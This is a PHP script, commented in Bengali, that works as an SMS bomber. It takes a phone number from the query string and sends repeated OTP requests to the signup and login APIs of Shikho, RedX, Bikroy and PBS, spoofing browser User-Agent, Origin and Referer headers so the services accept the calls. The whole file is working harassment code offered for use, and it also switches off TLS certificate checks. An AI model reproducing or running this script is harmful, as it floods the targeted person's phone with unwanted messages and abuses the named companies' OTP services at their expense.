<?php
// ১. CORS এবং সিকিউরিটি হেডার (বটের কানেকশন ঠিক করার জন্য)
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

// স্ক্রিপ্ট যেন মাঝপথে বন্ধ না হয়
set_time_limit(0); 

// ২. ফোন নাম্বার চেক
if(!isset($_GET['phone']) || empty($_GET['phone'])){
    echo json_encode(["status" => "error", "message" => "Phone number missing"]);
    exit;
}

$phone = $_GET['phone'];
$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
$phone_88 = "88" . $phone_11;

$responses = [];

/**
 * কমন CURL ফাংশন
 */
function send_req($url, $method = 'GET', $data = null, $headers = []) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 25, // টাইমআউট সামান্য বাড়ানো হলো
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_POSTFIELDS => ($data ? json_encode($data) : null),
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_ENCODING => '', 
    ]);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    
    if ($err) return ["error" => $err];
    return json_decode($res, true) ?: $res;
}

// --- সার্ভিস লুপ শুরু ---

// ১. Shikho - ১ বার (উন্নত হেডারসহ)
$sh_headers = [
    'Content-Type: application/json',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Origin: https://shikho.com',
    'Referer: https://shikho.com/'
];
$responses["shikho"] = send_req('https://api.shikho.com/auth/v2/send/sms', 'POST', 
    ["phone" => $phone_88, "type" => "student", "auth_type" => "signup", "vendor" => "shikho"], 
    $sh_headers);
sleep(2);

// ২. RedX - ৩ বার
for($i=1; $i<=3; $i++){
    $responses["redx_$i"] = send_req('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', 
        ["phoneNumber" => $phone_11], ['Content-Type: application/json', 'origin: https://redx.com.bd']);
    sleep(3);
}

// ৩. Bikroy - ৩ বার
for($i=1; $i<=3; $i++){
    $responses["bikroy_$i"] = send_req("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET', null, ['Accept: application/json', 'User-Agent: Mozilla/5.0']);
    sleep(2);
}

// ৪. PBS - ৩ বার
$pbs_headers = [
    'Content-Type: application/json', 
    'origin: https://pbs.com.bd', 
    'referer: https://pbs.com.bd/',
    'User-Agent: Mozilla/5.0'
];
for($i=1; $i<=3; $i++){
    $responses["pbs_$i"] = send_req('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', 
        ["userPhone" => $phone_11, "otp" => ""], $pbs_headers);
    sleep(2);
}

// ফাইনাল আউটপুট
echo json_encode($responses, JSON_PRETTY_PRINT);
?>
